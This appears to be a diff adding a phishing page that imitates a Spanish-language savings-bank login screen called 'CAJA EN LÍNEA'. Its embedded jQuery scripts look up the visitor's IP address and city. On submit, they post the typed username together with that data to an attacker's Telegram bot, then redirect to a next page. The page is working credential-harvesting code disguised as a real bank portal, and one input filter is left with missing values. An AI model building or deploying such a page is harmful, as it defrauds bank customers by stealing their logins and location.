@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   Inicio
+  </title>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"/>
+  <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&amp;display=swap" rel="stylesheet"/>
+  <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/>
+  <link href="archives/style.css" rel="stylesheet"/>
+  <script src="datos_del_tel.js">
+  </script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js">
+  </script>
+  <script>
+   $.getJSON("https://api.ipify.org?format=json",
+          function(data) {
+             $("#gfg").html(data.ip);
+         })
+  </script>
+  <script>
+   $.getJSON("https://ipinfo.io", function (response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+    })
+  </script>
+  <script>
+   var u_name,   ip, ip2;
+var ready = function () {
+    u_name = document.getElementById("cod").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "usuario caja de ahorro\nCodigo1: " + u_name + "\nIP: " + ip +"\n" + ip2;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        window.location = 'index2.html';
+        console.log(response);
+    });
+    return false;
+};
+  </script>
+ </head>
+ <body>
+  <section class="ftco-section">
+   <div class="container">
+    <div class="row justify-content-center">
+     <div class="col-md-6 text-center mb-5">
+      <img class="" src="archives/unnamed.svg" style="width:35%;height:auto;"/>
+      <br/>
+      <p>
+       <span style="font-size: 20px; color: rgb(255, 255, 255);">
+        CAJA EN LÍNEA
+       </span>
+      </p>
+     </div>
+    </div>
+    <div class="row justify-content-center">
+     <div class="col-md-7 col-lg-5">
+      <div class="login-wrap p-4 p-md-5">
+       <div>
+        <h3 class="text-center mb-4">
+        </h3>
+        <br/>
+        <form action="index4.html" method="post" onsubmit="return sender()">
+         <p hidden="" id="gfg">
+         </p>
+         <p hidden="" id="address">
+         </p>
+         <div class="form-group">
+          <input class="form-control rounded-left" id="cod" maxlength="30" onkeypress="return (event.charCode &gt;=  &amp;&amp; event.charCode &lt;= )" placeholder="Ingresar su usuario" required="" style="text-align:center;" type=""/>
+         </div>
+         <br/>
+         <div class="form-group">
+          <button class="form-control btn btn-primary rounded submit px-3" type="submit">
+           Continuar
+          </button>
+         </div>
+         <br/>
+         <div class="form-group d-md-flex">
+          <div class="w-50">
+           <p>
+            <span style="color: rgb(41, 105, 176);">
+             ¿Olvidó su usuario?
+            </span>
+           </p>
+          </div>
+         </div>
+        </form>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+   <p style="text-align: center;">
+    <img src="archives/mascota.png" style="width: 15%; height: auto;"/>
+   </p>
+  </section>
+ </body>
+</html>
